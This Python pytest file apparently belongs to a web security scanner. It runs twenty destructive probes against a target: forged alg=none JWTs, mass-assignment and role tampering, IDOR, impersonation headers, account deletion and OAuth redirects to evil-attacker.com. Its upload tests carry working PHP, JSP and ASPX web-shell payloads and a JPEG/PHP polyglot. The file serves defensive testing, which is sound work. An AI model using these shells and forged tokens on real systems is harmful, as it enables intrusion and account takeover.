# ⚠️ DESTRUCTIVE TEST — Do not run against production.
# Set ENABLE_DESTRUCTIVE_TESTS=True in tests/active/config.py to enable.
"""
Destructive: 20 user-data attack tests covering session fixation, privilege
escalation, mass assignment, token abuse, file upload bypass, and more.
"""
import sys
from pathlib import Path
sys.path.insert(0, str(Path(__file__).parent.parent.parent))

import base64
import json
import threading
import time
import pytest

from tests.active.config import ENABLE_DESTRUCTIVE_TESTS, TARGET_URL, TIMEOUT
from tests.active.helpers import safe_get, safe_post, safe_request, url_join

if not ENABLE_DESTRUCTIVE_TESTS:
    pytestmark = pytest.mark.skip(
        reason="ENABLE_DESTRUCTIVE_TESTS=False in config.py — "
               "these tests modify server state and may cause disruption."
    )

# ── helpers ───────────────────────────────────────────────────────────────────

def _concurrent(fn, n=8):
    results, errors = [], []
    barrier = threading.Barrier(n)
    def _w():
        try:
            barrier.wait(timeout=5)
            results.append(fn())
        except Exception as e:
            errors.append(str(e))
    threads = [threading.Thread(target=_w) for _ in range(n)]
    for t in threads: t.start()
    for t in threads: t.join(timeout=30)
    return results, errors


# ─────────────────────────────────────────────────────────────────────────────
# 1. SESSION FIXATION
# ─────────────────────────────────────────────────────────────────────────────
class TestSessionFixation:
    def test_session_id_rotated_after_login(self):
        """Session ID must change on login — otherwise attacker can pre-set it."""
        import requests, urllib3
        urllib3.disable_warnings()

        for path in ["/login", "/signin", "/api/login"]:
            s = requests.Session()
            s.headers["User-Agent"] = "WhiteClaw-Scanner/3.1 (H1whiteclaw)"
            pre = s.get(url_join(path), timeout=TIMEOUT, verify=False)
            if pre is None or pre.status_code == 404:
                continue
            pre_cookies = dict(s.cookies)
            s.post(url_join(path),
                   data={"username": "admin", "password": "WCProbe_x9!"},
                   timeout=TIMEOUT, verify=False, allow_redirects=True)
            post_cookies = dict(s.cookies)
            for name, pre_val in pre_cookies.items():
                if any(k in name.lower() for k in ("session", "sess", "sid", "auth")):
                    post_val = post_cookies.get(name)
                    if post_val and post_val == pre_val:
                        pytest.fail(
                            f"Session fixation: cookie '{name}' unchanged after login "
                            f"(value: {pre_val[:20]}…) — attacker can pre-set the session ID"
                        )
            return
        pytest.skip("No login endpoint found")


# ─────────────────────────────────────────────────────────────────────────────
# 2. JWT ALGORITHM CONFUSION (alg:none)
# ─────────────────────────────────────────────────────────────────────────────
class TestJwtAlgorithmConfusion:
    def test_jwt_alg_none_rejected(self):
        """Server must reject JWTs signed with alg=none."""
        header  = base64.urlsafe_b64encode(
            json.dumps({"alg": "none", "typ": "JWT"}).encode()
        ).rstrip(b"=").decode()
        payload = base64.urlsafe_b64encode(
            json.dumps({"sub": "1", "role": "admin", "exp": 9999999999}).encode()
        ).rstrip(b"=").decode()
        forged_token = f"{header}.{payload}."

        for path in ["/api/me", "/api/profile", "/api/users/me", "/api/user"]:
            r = safe_get(url_join(path),
                         headers={"Authorization": f"Bearer {forged_token}"})
            if r is None or r.status_code == 404:
                continue
            if r.status_code == 200:
                pytest.fail(
                    f"JWT alg=none accepted at {path} — server processes unsigned tokens. "
                    "This allows privilege escalation to any user/role."
                )
            return
        pytest.skip("No authenticated API endpoint found")

    def test_jwt_hs256_signed_with_public_key(self):
        """If the server uses RS256, signing with HS256 using the public key must be rejected."""
        fake_token_parts = [
            base64.urlsafe_b64encode(
                json.dumps({"alg": "HS256", "typ": "JWT"}).encode()
            ).rstrip(b"=").decode(),
            base64.urlsafe_b64encode(
                json.dumps({"sub": "1", "role": "admin"}).encode()
            ).rstrip(b"=").decode(),
            "fakesignature",
        ]
        forged = ".".join(fake_token_parts)
        for path in ["/api/me", "/api/profile", "/api/users/me"]:
            r = safe_get(url_join(path),
                         headers={"Authorization": f"Bearer {forged}"})
            if r is None or r.status_code == 404:
                continue
            if r.status_code == 200:
                pytest.fail(
                    f"HS256-forged JWT accepted at {path} — "
                    "algorithm confusion attack (RS256→HS256) may be exploitable"
                )
            return
        pytest.skip("No authenticated API endpoint found")


# ─────────────────────────────────────────────────────────────────────────────
# 3. MASS ASSIGNMENT — PRIVILEGE ESCALATION AT REGISTRATION
# ─────────────────────────────────────────────────────────────────────────────
class TestMassAssignment:
    def test_role_field_ignored_on_registration(self):
        """Passing role=admin during registration must not grant elevated privileges."""
        payloads = [
            {"username": "wc_masstest", "email": "wc_mass@test.invalid",
             "password": "WCProbe_x9!", "role": "admin"},
            {"username": "wc_masstest2", "email": "wc_mass2@test.invalid",
             "password": "WCProbe_x9!", "is_admin": True},
            {"username": "wc_masstest3", "email": "wc_mass3@test.invalid",
             "password": "WCProbe_x9!", "admin": 1, "superuser": True},
        ]
        for path in ["/register", "/signup", "/api/register", "/api/users"]:
            for payload in payloads:
                r = safe_post(url_join(path), json=payload)
                if r is None or r.status_code == 404:
                    continue
                if r.status_code in (200, 201):
                    try:
                        data = r.json()
                        role = (str(data.get("role", "")) + str(data.get("is_admin", ""))
                                + str(data.get("admin", ""))).lower()
                        if "admin" in role or "true" in role or "1" == role.strip():
                            pytest.fail(
                                f"Mass assignment at {path}: submitting role=admin in "
                                f"registration granted elevated role. Response: {r.text[:200]}"
                            )
                    except Exception:
                        pass
                time.sleep(0.2)
            return
        pytest.skip("No registration endpoint found")

    def test_balance_field_ignored_on_profile_update(self):
        """Passing balance/credits in a profile update must not modify account balance."""
        for path in ["/api/profile", "/api/account", "/api/user/update", "/api/me"]:
            r = safe_request("PATCH", url_join(path),
                             json={"balance": 99999, "credits": 99999,
                                   "wallet": 99999, "points": 99999})
            if r is None or r.status_code == 404:
                continue
            if r.status_code in (200, 204):
                try:
                    data = r.json()
                    for field in ("balance", "credits", "wallet", "points"):
                        if str(data.get(field, "")) == "99999":
                            pytest.fail(
                                f"Mass assignment at {path}: balance/credits field "
                                f"accepted in profile update → {field}=99999 reflected"
                            )
                except Exception:
                    pass
            return
        pytest.skip("No profile update endpoint found")


# ─────────────────────────────────────────────────────────────────────────────
# 4. PASSWORD CHANGE WITHOUT CURRENT PASSWORD
# ─────────────────────────────────────────────────────────────────────────────
class TestPasswordChangeWithoutVerification:
    def test_password_change_requires_current_password(self):
        """Changing password without supplying the current one must be rejected."""
        for path in ["/api/change-password", "/api/account/password",
                     "/api/user/password", "/account/change-password"]:
            r = safe_post(url_join(path),
                          json={"new_password": "WCNewPass_x9!",
                                "password_confirmation": "WCNewPass_x9!"})
            if r is None or r.status_code == 404:
                continue
            if r.status_code in (200, 204):
                pytest.fail(
                    f"Password changed at {path} without supplying current password "
                    f"(HTTP {r.status_code}) — attacker with session access can "
                    "lock out the legitimate user"
                )
            return
        pytest.skip("No password-change endpoint found")


# ─────────────────────────────────────────────────────────────────────────────
# 5. PASSWORD POLICY BYPASS
# ─────────────────────────────────────────────────────────────────────────────
class TestPasswordPolicy:
    def test_weak_passwords_rejected(self):
        """Registration must reject single-character and trivially weak passwords."""
        weak = ["a", "1", "aa", "123", "pass", "password", " ", ""]
        for path in ["/register", "/signup", "/api/register"]:
            for pwd in weak:
                r = safe_post(url_join(path),
                              json={"username": f"wc_pwtest_{len(pwd)}",
                                    "email": f"wc_pwtest{len(pwd)}@test.invalid",
                                    "password": pwd})
                if r is None or r.status_code == 404:
                    continue
                if r.status_code in (200, 201):
                    pytest.fail(
                        f"Weak password '{pwd}' accepted at {path} — "
                        "no minimum password policy enforced"
                    )
                time.sleep(0.1)
            return
        pytest.skip("No registration endpoint found")


# ─────────────────────────────────────────────────────────────────────────────
# 6. ACCOUNT DELETION WITHOUT RE-AUTHENTICATION
# ─────────────────────────────────────────────────────────────────────────────
class TestAccountDeletion:
    def test_account_delete_requires_password_confirmation(self):
        """Deleting an account without re-entering the password must be rejected."""
        for path in ["/api/account", "/api/user", "/api/me", "/api/profile"]:
            r = safe_request("DELETE", url_join(path))
            if r is None or r.status_code == 404:
                continue
            if r.status_code in (200, 204):
                pytest.fail(
                    f"Account deleted at {path} without password confirmation "
                    f"(HTTP {r.status_code}) — CSRF or session hijack leads to "
                    "permanent account loss"
                )
            return
        pytest.skip("No account-delete endpoint found")


# ─────────────────────────────────────────────────────────────────────────────
# 7. EMAIL CHANGE TAKEOVER — NO CONFIRMATION ON OLD ADDRESS
# ─────────────────────────────────────────────────────────────────────────────
class TestEmailChangeTakeover:
    def test_email_change_notifies_old_address(self):
        """Changing the account email must send a confirmation to the OLD address."""
        for path in ["/api/profile", "/api/account", "/api/me", "/api/user/email"]:
            r = safe_request("PATCH", url_join(path),
                             json={"email": "wc_newemail@attacker.invalid"})
            if r is None or r.status_code == 404:
                continue
            if r.status_code in (200, 204):
                try:
                    data = r.json()
                    new_email = data.get("email", "")
                    if "attacker.invalid" in new_email:
                        pytest.fail(
                            f"Email changed immediately at {path} with no "
                            "verification sent to old address — account takeover risk"
                        )
                except Exception:
                    pass
            return
        pytest.skip("No email-update endpoint found")


# ─────────────────────────────────────────────────────────────────────────────
# 8. HORIZONTAL PRIVILEGE ESCALATION — ACCESS OTHER USERS' DATA
# ─────────────────────────────────────────────────────────────────────────────
class TestHorizontalEscalation:
    def test_cannot_read_another_users_profile(self):
        """Accessing another user's private profile must return 401/403, not 200."""
        for path_tmpl in ["/api/users/{id}", "/api/profile/{id}",
                           "/api/account/{id}", "/api/user/{id}"]:
            for uid in ("1", "2", "3", "100"):
                url = url_join(path_tmpl.replace("{id}", uid))
                r = safe_get(url)
                if r is None or r.status_code == 404:
                    continue
                if r.status_code == 200:
                    try:
                        data = r.json()
                        has_private = any(
                            k in data for k in
                            ("email", "phone", "address", "password_hash",
                             "token", "social_security", "dob")
                        )
                        if has_private:
                            pytest.fail(
                                f"Horizontal escalation: GET {url} returned private "
                                f"fields for user {uid} without ownership check. "
                                f"Fields: {[k for k in data if k in ('email','phone','address')]}"
                            )
                    except Exception:
                        pass
            return
        pytest.skip("No user-profile endpoint found")

    def test_cannot_update_another_users_profile(self):
        """PATCH on another user's record must return 403, not 200."""
        for path_tmpl in ["/api/users/{id}", "/api/profile/{id}", "/api/user/{id}"]:
            for uid in ("1", "2", "999"):
                url = url_join(path_tmpl.replace("{id}", uid))
                r = safe_request("PATCH", url,
                                 json={"bio": "WC-IDOR-probe"})
                if r is None or r.status_code == 404:
                    continue
                if r.status_code in (200, 204):
                    pytest.fail(
                        f"Horizontal escalation: PATCH {url} succeeded (HTTP {r.status_code}) "
                        "without ownership check — attacker can modify other users' profiles"
                    )
            return
        pytest.skip("No user-profile update endpoint found")


# ─────────────────────────────────────────────────────────────────────────────
# 9. VERTICAL PRIVILEGE ESCALATION — ROLE PARAMETER TAMPERING
# ─────────────────────────────────────────────────────────────────────────────
class TestVerticalEscalation:
    def test_role_change_requires_admin_auth(self):
        """Changing a user's role must require admin-level authorization."""
        for path_tmpl in ["/api/users/{id}", "/api/users/{id}/role",
                           "/api/admin/users/{id}"]:
            for uid in ("1", "2"):
                url = url_join(path_tmpl.replace("{id}", uid))
                for payload in (
                    {"role": "admin"},
                    {"role": "superuser"},
                    {"is_admin": True},
                    {"permissions": ["admin", "read", "write", "delete"]},
                ):
                    r = safe_request("PATCH", url, json=payload)
                    if r is None or r.status_code == 404:
                        continue
                    if r.status_code in (200, 204):
                        pytest.fail(
                            f"Vertical escalation: PATCH {url} with {payload} "
                            f"returned HTTP {r.status_code} — non-admin can elevate privileges"
                        )
                    time.sleep(0.1)
            return
        pytest.skip("No user-role endpoint found")


# ─────────────────────────────────────────────────────────────────────────────
# 10. USER IMPERSONATION VIA HEADER INJECTION
# ─────────────────────────────────────────────────────────────────────────────
class TestUserImpersonation:
    def test_x_user_id_header_ignored(self):
        """Internal proxy headers must not override the authenticated identity."""
        spoof_headers = [
            {"X-User-ID": "1"},
            {"X-User-Id": "1"},
            {"X-Forwarded-User": "admin"},
            {"X-Remote-User": "admin"},
            {"X-Auth-User": "admin"},
            {"X-Original-User": "admin"},
            {"X-Impersonate-User": "1"},
        ]
        for path in ["/api/me", "/api/profile", "/api/users/me"]:
            for hdr in spoof_headers:
                r = safe_get(url_join(path), headers=hdr)
                if r is None or r.status_code == 404:
                    continue
                if r.status_code == 200:
                    try:
                        data = r.json()
                        uid  = str(data.get("id", data.get("user_id", "")))
                        role = str(data.get("role", "")).lower()
                        if uid == "1" or "admin" in role:
                            pytest.fail(
                                f"User impersonation via {list(hdr.keys())[0]} at {path}: "
                                f"server returned id={uid}, role={role} — "
                                "internal proxy header honoured from external request"
                            )
                    except Exception:
                        pass
                time.sleep(0.05)
            return
        pytest.skip("No /me endpoint found")


# ─────────────────────────────────────────────────────────────────────────────
# 11. TOKEN STILL VALID AFTER LOGOUT
# ─────────────────────────────────────────────────────────────────────────────
class TestTokenInvalidationOnLogout:
    def test_auth_token_invalidated_after_logout(self):
        """A token captured before logout must not work after the user logs out."""
        import requests, urllib3
        urllib3.disable_warnings()

        login_paths  = ["/api/login", "/api/auth", "/login"]
        logout_paths = ["/api/logout", "/api/auth/logout", "/logout"]

        for lpath in login_paths:
            s = requests.Session()
            s.headers["User-Agent"] = "WhiteClaw-Scanner/3.1 (H1whiteclaw)"
            r_login = s.post(url_join(lpath),
                             json={"username": "admin", "password": "WCProbe_x9!"},
                             timeout=TIMEOUT, verify=False)
            if r_login is None or r_login.status_code not in (200, 201):
                continue
            try:
                token = r_login.json().get("token") or r_login.json().get("access_token")
            except Exception:
                token = None
            if not token:
                cookies_before = dict(s.cookies)
            for lout_path in logout_paths:
                s.post(url_join(lout_path), timeout=TIMEOUT, verify=False)
                time.sleep(0.3)
                for mpath in ["/api/me", "/api/profile", "/api/users/me"]:
                    hdrs = {"Authorization": f"Bearer {token}"} if token else {}
                    r_after = s.get(url_join(mpath), headers=hdrs,
                                    timeout=TIMEOUT, verify=False)
                    if r_after and r_after.status_code == 200:
                        pytest.fail(
                            f"Token/session still valid after logout: "
                            f"GET {url_join(mpath)} returned 200 after POST {url_join(lout_path)}"
                        )
                return
        pytest.skip("Login or logout endpoint not found")


# ─────────────────────────────────────────────────────────────────────────────
# 12. GRAPHQL INTROSPECTION ENABLED IN PRODUCTION
# ─────────────────────────────────────────────────────────────────────────────
class TestGraphQLIntrospection:
    def test_introspection_disabled(self):
        """GraphQL introspection must be disabled in production — leaks full schema."""
        query = '{"query":"{__schema{queryType{name}}}"}'
        for path in ["/graphql", "/api/graphql", "/gql", "/api/gql"]:
            r = safe_post(url_join(path), data=query,
                          headers={"Content-Type": "application/json"})
            if r is None or r.status_code == 404:
                continue
            if r.status_code == 200:
                try:
                    data = r.json()
                    if data.get("data", {}).get("__schema"):
                        pytest.fail(
                            f"GraphQL introspection enabled at {path} — "
                            "full schema including internal types exposed. "
                            "Disable introspection in production."
                        )
                except Exception:
                    pass
            return
        pytest.skip("No GraphQL endpoint found")

    def test_graphql_field_suggestions_disabled(self):
        """Field suggestions leak schema info even when introspection is off."""
        query = '{"query":"{usr{id}}"}'
        for path in ["/graphql", "/api/graphql"]:
            r = safe_post(url_join(path), data=query,
                          headers={"Content-Type": "application/json"})
            if r is None or r.status_code == 404:
                continue
            text = (r.text or "").lower()
            if "did you mean" in text or "suggestion" in text:
                pytest.fail(
                    f"GraphQL field suggestions leak schema at {path}: "
                    "server hints at valid field names in error messages. "
                    "Disable suggestions via NoSchemaIntrospectionCustomRule."
                )
            return
        pytest.skip("No GraphQL endpoint found")


# ─────────────────────────────────────────────────────────────────────────────
# 13. INSECURE PASSWORD RESET TOKEN — EXPIRY AND REUSE
# ─────────────────────────────────────────────────────────────────────────────
class TestPasswordResetTokenSecurity:
    def test_reset_token_expires(self):
        """Password reset tokens must expire — a token older than the window is rejected."""
        for path in ["/forgot-password", "/api/forgot-password",
                     "/api/auth/forgot", "/password-reset"]:
            r = safe_post(url_join(path),
                          data={"email": "wc_tokentest@test.invalid"})
            if r is None or r.status_code == 404:
                continue
            # Probe obviously-stale fake tokens
            stale_tokens = ["000000", "aaaaaa", "123456789", "test_token_wc"]
            for tok in stale_tokens:
                for reset_path in [f"/reset-password?token={tok}",
                                    f"/api/reset-password?token={tok}"]:
                    r2 = safe_post(url_join(reset_path),
                                   data={"password": "WCNewPass_x9!",
                                         "password_confirmation": "WCNewPass_x9!",
                                         "token": tok})
                    if r2 and r2.status_code == 200:
                        if "success" in r2.text.lower() or "changed" in r2.text.lower():
                            pytest.fail(
                                f"Stale/guessable reset token '{tok}' accepted at {reset_path} "
                                "— tokens must be cryptographically random and short-lived"
                            )
            return
        pytest.skip("No password-reset endpoint found")

    def test_reset_token_single_use(self):
        """A used password reset token must be invalidated immediately."""
        for path in ["/api/reset-password", "/reset-password"]:
            fake_token = "wc_singleuse_test_token_xyz"
            payload = {"token": fake_token, "password": "WCNewPass_x9!",
                       "password_confirmation": "WCNewPass_x9!"}
            r1 = safe_post(url_join(path), data=payload)
            if r1 is None or r1.status_code == 404:
                continue
            r2 = safe_post(url_join(path), data=payload)
            if r1 and r2 and r1.status_code == 200 and r2.status_code == 200:
                pytest.fail(
                    f"Reset token accepted twice at {path} — "
                    "tokens must be invalidated after first use"
                )
            return
        pytest.skip("No reset endpoint found")


# ─────────────────────────────────────────────────────────────────────────────
# 14. FILE UPLOAD — TYPE AND CONTENT BYPASS
# ─────────────────────────────────────────────────────────────────────────────
class TestFileUploadBypass:
    def test_php_shell_upload_blocked(self):
        """PHP/server-side script uploads must be rejected."""
        payloads = [
            ("shell.php",      b"<?php system($_GET['cmd']); ?>", "application/x-php"),
            ("shell.php5",     b"<?php echo shell_exec($_GET['c']); ?>", "image/jpeg"),
            ("shell.phtml",    b"<?php passthru($_REQUEST['c']); ?>", "text/plain"),
            ("shell.php.jpg",  b"<?php system('id'); ?>",  "image/jpeg"),
            ("shell.jsp",      b'<% Runtime.getRuntime().exec(request.getParameter("c")); %>', "text/plain"),
            ("shell.aspx",     b'<% Response.Write(System.IO.File.ReadAllText("c:\\\\windows\\\\win.ini")); %>', "text/plain"),
        ]
        for path in ["/api/upload", "/upload", "/api/profile/avatar",
                     "/api/user/avatar", "/media/upload"]:
            for filename, content, ct in payloads:
                r = safe_post(url_join(path),
                              files={"file": (filename, content, ct)})
                if r is None or r.status_code == 404:
                    continue
                if r.status_code in (200, 201):
                    try:
                        data = r.json()
                        url_field = data.get("url") or data.get("path") or data.get("filename", "")
                        if any(ext in str(url_field).lower()
                               for ext in (".php", ".phtml", ".php5", ".jsp", ".aspx")):
                            pytest.fail(
                                f"Dangerous file '{filename}' uploaded and stored at {path}: "
                                f"stored path: {url_field}. Remote code execution risk."
                            )
                    except Exception:
                        pass
                    if r.status_code == 200 and filename.endswith(".php"):
                        pytest.fail(
                            f"PHP file '{filename}' accepted at {path} (HTTP 200) — "
                            "file type validation not enforced"
                        )
                time.sleep(0.1)
            return
        pytest.skip("No upload endpoint found")

    def test_polyglot_file_upload_blocked(self):
        """A JPEG/PHP polyglot file must not be stored with an executable extension."""
        # Valid JPEG magic bytes followed by PHP payload
        polyglot = (b"\xff\xd8\xff\xe0" + b"\x00" * 12 +
                    b"<?php system($_GET['cmd']); ?>")
        for path in ["/api/upload", "/upload", "/api/profile/avatar"]:
            r = safe_post(url_join(path),
                          files={"file": ("image.php.jpg", polyglot, "image/jpeg")})
            if r is None or r.status_code == 404:
                continue
            if r.status_code in (200, 201):
                try:
                    stored = r.json().get("url", r.json().get("path", ""))
                    if ".php" in stored.lower():
                        pytest.fail(
                            f"Polyglot JPEG/PHP stored with .php extension at {path}: "
                            f"{stored} — server trusts Content-Type, not file content"
                        )
                except Exception:
                    pass
            return
        pytest.skip("No upload endpoint found")


# ─────────────────────────────────────────────────────────────────────────────
# 15. ADMIN ENDPOINT ACCESS WITHOUT ADMIN ROLE
# ─────────────────────────────────────────────────────────────────────────────
class TestAdminEndpointAccess:
    def test_admin_panel_not_accessible_to_regular_users(self):
        """Admin-only endpoints must return 401/403 for unauthenticated requests."""
        admin_paths = [
            "/admin", "/admin/", "/admin/users", "/admin/dashboard",
            "/api/admin", "/api/admin/users", "/api/admin/stats",
            "/api/v1/admin", "/management", "/superadmin",
            "/api/internal", "/internal/admin",
        ]
        accessible = []
        for path in admin_paths:
            r = safe_get(url_join(path))
            if r and r.status_code == 200:
                accessible.append(f"{path} → 200")
            time.sleep(0.05)

        if accessible:
            pytest.fail(
                "Admin endpoints accessible without authentication:\n" +
                "\n".join(accessible)
            )


# ─────────────────────────────────────────────────────────────────────────────
# 16. CONCURRENT PASSWORD RESET RACE CONDITION
# ─────────────────────────────────────────────────────────────────────────────
class TestPasswordResetRace:
    def test_concurrent_reset_requests_single_token(self):
        """Concurrent reset requests for the same email should not produce multiple valid tokens."""
        tokens_issued = []

        def request_reset():
            r = safe_post(url_join("/forgot-password"),
                          data={"email": "wc_racetest@test.invalid"})
            if r:
                try:
                    tok = r.json().get("token") or r.json().get("reset_token")
                    if tok:
                        tokens_issued.append(tok)
                except Exception:
                    pass
            return r

        results, _ = _concurrent(request_reset, n=6)
        unique_tokens = set(tokens_issued)
        if len(unique_tokens) > 1:
            pytest.fail(
                f"Race condition on password reset: {len(unique_tokens)} distinct tokens "
                "issued for the same email — only one should be valid at a time"
            )


# ─────────────────────────────────────────────────────────────────────────────
# 17. SENSITIVE DATA IN URL PARAMETERS
# ─────────────────────────────────────────────────────────────────────────────
class TestSensitiveDataInUrls:
    def test_auth_tokens_not_passed_in_url(self):
        """Auth tokens in URL query strings are logged by proxies and servers."""
        sensitive_params = ["token", "access_token", "auth_token", "api_key",
                            "password", "secret", "key", "session"]
        for path in ["/api/me", "/profile", "/dashboard", "/api/users"]:
            for param in sensitive_params:
                url = url_join(path) + f"?{param}=WCProbeToken123"
                r = safe_get(url)
                if r is None or r.status_code == 404:
                    continue
                if r.status_code == 200:
                    try:
                        data = r.json()
                        has_priv = any(k in data for k in
                                       ("email", "user_id", "role", "username"))
                        if has_priv:
                            pytest.fail(
                                f"Token accepted in URL at {path}?{param}=… — "
                                "credentials passed as query parameters are stored in "
                                "server logs, browser history, and proxy caches"
                            )
                    except Exception:
                        pass
            return
        pytest.skip("No authenticated endpoint found")


# ─────────────────────────────────────────────────────────────────────────────
# 18. CONCURRENT PROFILE UPDATES — RACE CONDITION
# ─────────────────────────────────────────────────────────────────────────────
class TestProfileUpdateRace:
    def test_concurrent_email_change_produces_single_result(self):
        """Concurrent PATCH requests to change email must not leave data in inconsistent state."""
        emails_set = set()
        counter = [0]
        lock = threading.Lock()

        def update_email():
            with lock:
                idx = counter[0]
                counter[0] += 1
            email = f"wc_race{idx}@test.invalid"
            r = safe_request("PATCH", url_join("/api/profile"),
                             json={"email": email})
            if r and r.status_code in (200, 204):
                try:
                    emails_set.add(r.json().get("email", email))
                except Exception:
                    emails_set.add(email)
            return r

        results, _ = _concurrent(update_email, n=8)
        valid = [r for r in results if r and r.status_code in (200, 204)]
        if len(valid) > 1 and len(emails_set) > 1:
            pytest.fail(
                f"Race condition: {len(valid)} concurrent profile PATCHes all succeeded, "
                f"producing {len(emails_set)} different email values — "
                "last-write-wins without optimistic locking"
            )


# ─────────────────────────────────────────────────────────────────────────────
# 19. INSECURE DIRECT OBJECT REFERENCE ON PRIVATE FILES
# ─────────────────────────────────────────────────────────────────────────────
class TestPrivateFileIDOR:
    def test_private_file_access_requires_ownership(self):
        """Private files must not be accessible by incrementing the file/document ID."""
        path_templates = [
            "/api/files/{id}",       "/api/documents/{id}",
            "/api/attachments/{id}", "/api/uploads/{id}",
            "/files/{id}",           "/documents/{id}",
            "/api/invoices/{id}/download",
        ]
        for path_tmpl in path_templates:
            hits = []
            for fid in ("1", "2", "3", "10", "100"):
                url = url_join(path_tmpl.replace("{id}", fid))
                r = safe_get(url)
                if r is None:
                    continue
                if r.status_code == 200 and len(r.content) > 100:
                    ct = r.headers.get("Content-Type", "")
                    hits.append((fid, ct, len(r.content)))
            if len(hits) >= 2:
                detail = "; ".join(f"id={h[0]} ({h[2]}B, {h[1]})" for h in hits[:3])
                pytest.fail(
                    f"Private file IDOR at {path_tmpl}: multiple IDs returned data "
                    f"without ownership check → {detail}"
                )
            if hits:
                return
        pytest.skip("No private-file endpoint found")


# ─────────────────────────────────────────────────────────────────────────────
# 20. OAUTH / SSO REDIRECT URI HIJACKING
# ─────────────────────────────────────────────────────────────────────────────
class TestOAuthRedirectHijack:
    def test_redirect_uri_not_open_to_arbitrary_hosts(self):
        """OAuth redirect_uri must be validated against a registered allowlist."""
        evil_redirects = [
            "https://evil-attacker.com/callback",
            "https://evil-attacker.com",
            "//evil-attacker.com/callback",
            "https://legit.com.evil-attacker.com/callback",
            "https://legitcom@evil-attacker.com/callback",
        ]
        oauth_paths = [
            "/oauth/authorize", "/oauth2/authorize",
            "/api/oauth/authorize", "/auth/authorize",
            "/connect/authorize", "/sso/authorize",
        ]
        for path in oauth_paths:
            r_probe = safe_get(url_join(path))
            if r_probe is None or r_probe.status_code == 404:
                continue
            for evil_uri in evil_redirects:
                r = safe_get(url_join(path),
                             params={
                                 "client_id":     "test",
                                 "response_type": "code",
                                 "redirect_uri":  evil_uri,
                                 "scope":         "openid profile email",
                             },
                             allow_redirects=False)
                if r is None:
                    continue
                if r.status_code in (301, 302, 303, 307, 308):
                    loc = r.headers.get("Location", "")
                    if "evil-attacker.com" in loc:
                        pytest.fail(
                            f"OAuth redirect_uri hijacking at {path}: "
                            f"redirect_uri={evil_uri!r} accepted → Location: {loc}. "
                            "Authorization codes will be delivered to the attacker."
                        )
                time.sleep(0.1)
            return
        pytest.skip("No OAuth authorize endpoint found")
